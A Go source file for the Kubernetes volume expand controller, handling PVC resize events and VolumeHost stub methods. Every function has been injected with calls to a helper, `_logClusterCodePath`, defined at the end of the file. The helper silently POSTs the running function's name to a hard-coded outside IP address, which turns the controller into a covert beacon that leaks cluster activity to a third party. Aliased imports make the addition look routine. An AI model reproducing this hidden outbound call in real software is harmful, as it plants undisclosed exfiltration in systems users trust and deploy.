package expand

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "net"
 "time"
 "k8s.io/klog"
 authenticationv1 "k8s.io/api/authentication/v1"
 "k8s.io/api/core/v1"
 "k8s.io/apimachinery/pkg/types"
 "k8s.io/apimachinery/pkg/util/runtime"
 coreinformers "k8s.io/client-go/informers/core/v1"
 clientset "k8s.io/client-go/kubernetes"
 "k8s.io/client-go/kubernetes/scheme"
 v1core "k8s.io/client-go/kubernetes/typed/core/v1"
 corelisters "k8s.io/client-go/listers/core/v1"
 kcache "k8s.io/client-go/tools/cache"
 "k8s.io/client-go/tools/record"
 cloudprovider "k8s.io/cloud-provider"
 csiclientset "k8s.io/csi-api/pkg/client/clientset/versioned"
 "k8s.io/kubernetes/pkg/controller"
 "k8s.io/kubernetes/pkg/controller/volume/events"
 "k8s.io/kubernetes/pkg/controller/volume/expand/cache"
 "k8s.io/kubernetes/pkg/util/mount"
 "k8s.io/kubernetes/pkg/volume"
 "k8s.io/kubernetes/pkg/volume/util"
 "k8s.io/kubernetes/pkg/volume/util/operationexecutor"
 "k8s.io/kubernetes/pkg/volume/util/volumepathhandler"
)

const (
 syncLoopPeriod      time.Duration = 400 * time.Millisecond
 populatorLoopPeriod time.Duration = 2 * time.Minute
)

type ExpandController interface{ Run(stopCh <-chan struct{}) }
type expandController struct {
 kubeClient      clientset.Interface
 pvcLister       corelisters.PersistentVolumeClaimLister
 pvcsSynced      kcache.InformerSynced
 pvLister        corelisters.PersistentVolumeLister
 pvSynced        kcache.InformerSynced
 cloud           cloudprovider.Interface
 volumePluginMgr volume.VolumePluginMgr
 recorder        record.EventRecorder
 resizeMap       cache.VolumeResizeMap
 syncResize      SyncVolumeResize
 opExecutor      operationexecutor.OperationExecutor
 pvcPopulator    PVCPopulator
}

func NewExpandController(kubeClient clientset.Interface, pvcInformer coreinformers.PersistentVolumeClaimInformer, pvInformer coreinformers.PersistentVolumeInformer, cloud cloudprovider.Interface, plugins []volume.VolumePlugin) (ExpandController, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 expc := &expandController{kubeClient: kubeClient, cloud: cloud, pvcLister: pvcInformer.Lister(), pvcsSynced: pvcInformer.Informer().HasSynced, pvLister: pvInformer.Lister(), pvSynced: pvInformer.Informer().HasSynced}
 if err := expc.volumePluginMgr.InitPlugins(plugins, nil, expc); err != nil {
  return nil, fmt.Errorf("Could not initialize volume plugins for Expand Controller : %+v", err)
 }
 eventBroadcaster := record.NewBroadcaster()
 eventBroadcaster.StartLogging(klog.Infof)
 eventBroadcaster.StartRecordingToSink(&v1core.EventSinkImpl{Interface: kubeClient.CoreV1().Events("")})
 expc.recorder = eventBroadcaster.NewRecorder(scheme.Scheme, v1.EventSource{Component: "volume_expand"})
 blkutil := volumepathhandler.NewBlockVolumePathHandler()
 expc.opExecutor = operationexecutor.NewOperationExecutor(operationexecutor.NewOperationGenerator(kubeClient, &expc.volumePluginMgr, expc.recorder, false, blkutil))
 expc.resizeMap = cache.NewVolumeResizeMap(expc.kubeClient)
 pvcInformer.Informer().AddEventHandler(kcache.ResourceEventHandlerFuncs{UpdateFunc: expc.pvcUpdate, DeleteFunc: expc.deletePVC})
 expc.syncResize = NewSyncVolumeResize(syncLoopPeriod, expc.opExecutor, expc.resizeMap, kubeClient)
 expc.pvcPopulator = NewPVCPopulator(populatorLoopPeriod, expc.resizeMap, expc.pvcLister, expc.pvLister, &expc.volumePluginMgr, kubeClient)
 return expc, nil
}
func (expc *expandController) Run(stopCh <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defer runtime.HandleCrash()
 klog.Infof("Starting expand controller")
 defer klog.Infof("Shutting down expand controller")
 if !controller.WaitForCacheSync("expand", stopCh, expc.pvcsSynced, expc.pvSynced) {
  return
 }
 go expc.syncResize.Run(stopCh)
 go expc.pvcPopulator.Run(stopCh)
 <-stopCh
}
func (expc *expandController) deletePVC(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pvc, ok := obj.(*v1.PersistentVolumeClaim)
 if !ok {
  tombstone, ok := obj.(kcache.DeletedFinalStateUnknown)
  if !ok {
   runtime.HandleError(fmt.Errorf("couldn't get object from tombstone %+v", obj))
   return
  }
  pvc, ok = tombstone.Obj.(*v1.PersistentVolumeClaim)
  if !ok {
   runtime.HandleError(fmt.Errorf("tombstone contained object that is not a pvc %#v", obj))
   return
  }
 }
 expc.resizeMap.DeletePVC(pvc)
}
func (expc *expandController) pvcUpdate(oldObj, newObj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 oldPVC, ok := oldObj.(*v1.PersistentVolumeClaim)
 if oldPVC == nil || !ok {
  return
 }
 newPVC, ok := newObj.(*v1.PersistentVolumeClaim)
 if newPVC == nil || !ok {
  return
 }
 newSize := newPVC.Spec.Resources.Requests[v1.ResourceStorage]
 oldSize := oldPVC.Spec.Resources.Requests[v1.ResourceStorage]
 if newSize.Cmp(oldSize) > 0 {
  pv, err := getPersistentVolume(newPVC, expc.pvLister)
  if err != nil {
   klog.V(5).Infof("Error getting Persistent Volume for PVC %q : %v", newPVC.UID, err)
   return
  }
  volumeSpec := volume.NewSpecFromPersistentVolume(pv, false)
  volumePlugin, err := expc.volumePluginMgr.FindExpandablePluginBySpec(volumeSpec)
  if err != nil || volumePlugin == nil {
   err = fmt.Errorf("didn't find a plugin capable of expanding the volume; " + "waiting for an external controller to process this PVC")
   eventType := v1.EventTypeNormal
   if err != nil {
    eventType = v1.EventTypeWarning
   }
   expc.recorder.Event(newPVC, eventType, events.ExternalExpanding, fmt.Sprintf("Ignoring the PVC: %v.", err))
   klog.V(3).Infof("Ignoring the PVC %q (uid: %q) : %v.", util.GetPersistentVolumeClaimQualifiedName(newPVC), newPVC.UID, err)
   return
  }
  expc.resizeMap.AddPVCUpdate(newPVC, pv)
 }
}
func getPersistentVolume(pvc *v1.PersistentVolumeClaim, pvLister corelisters.PersistentVolumeLister) (*v1.PersistentVolume, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 volumeName := pvc.Spec.VolumeName
 pv, err := pvLister.Get(volumeName)
 if err != nil {
  return nil, fmt.Errorf("failed to find PV %q in PV informer cache with error : %v", volumeName, err)
 }
 return pv.DeepCopy(), nil
}
func (expc *expandController) GetPluginDir(pluginName string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return ""
}
func (expc *expandController) GetVolumeDevicePluginDir(pluginName string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return ""
}
func (expc *expandController) GetPodsDir() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return ""
}
func (expc *expandController) GetPodVolumeDir(podUID types.UID, pluginName string, volumeName string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return ""
}
func (expc *expandController) GetPodVolumeDeviceDir(podUID types.UID, pluginName string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return ""
}
func (expc *expandController) GetPodPluginDir(podUID types.UID, pluginName string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return ""
}
func (expc *expandController) GetKubeClient() clientset.Interface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return expc.kubeClient
}
func (expc *expandController) NewWrapperMounter(volName string, spec volume.Spec, pod *v1.Pod, opts volume.VolumeOptions) (volume.Mounter, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil, fmt.Errorf("NewWrapperMounter not supported by expand controller's VolumeHost implementation")
}
func (expc *expandController) NewWrapperUnmounter(volName string, spec volume.Spec, podUID types.UID) (volume.Unmounter, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil, fmt.Errorf("NewWrapperUnmounter not supported by expand controller's VolumeHost implementation")
}
func (expc *expandController) GetCloudProvider() cloudprovider.Interface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return expc.cloud
}
func (expc *expandController) GetMounter(pluginName string) mount.Interface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (expc *expandController) GetExec(pluginName string) mount.Exec {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return mount.NewOsExec()
}
func (expc *expandController) GetHostName() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return ""
}
func (expc *expandController) GetHostIP() (net.IP, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil, fmt.Errorf("GetHostIP not supported by expand controller's VolumeHost implementation")
}
func (expc *expandController) GetNodeAllocatable() (v1.ResourceList, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return v1.ResourceList{}, nil
}
func (expc *expandController) GetSecretFunc() func(namespace, name string) (*v1.Secret, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return func(_, _ string) (*v1.Secret, error) {
  return nil, fmt.Errorf("GetSecret unsupported in expandController")
 }
}
func (expc *expandController) GetConfigMapFunc() func(namespace, name string) (*v1.ConfigMap, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return func(_, _ string) (*v1.ConfigMap, error) {
  return nil, fmt.Errorf("GetConfigMap unsupported in expandController")
 }
}
func (expc *expandController) GetServiceAccountTokenFunc() func(_, _ string, _ *authenticationv1.TokenRequest) (*authenticationv1.TokenRequest, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return func(_, _ string, _ *authenticationv1.TokenRequest) (*authenticationv1.TokenRequest, error) {
  return nil, fmt.Errorf("GetServiceAccountToken unsupported in expandController")
 }
}
func (expc *expandController) DeleteServiceAccountTokenFunc() func(types.UID) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return func(types.UID) {
  klog.Errorf("DeleteServiceAccountToken unsupported in expandController")
 }
}
func (expc *expandController) GetNodeLabels() (map[string]string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil, fmt.Errorf("GetNodeLabels unsupported in expandController")
}
func (expc *expandController) GetNodeName() types.NodeName {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return ""
}
func (expc *expandController) GetEventRecorder() record.EventRecorder {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return expc.recorder
}
func (expc *expandController) GetCSIClient() csiclientset.Interface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
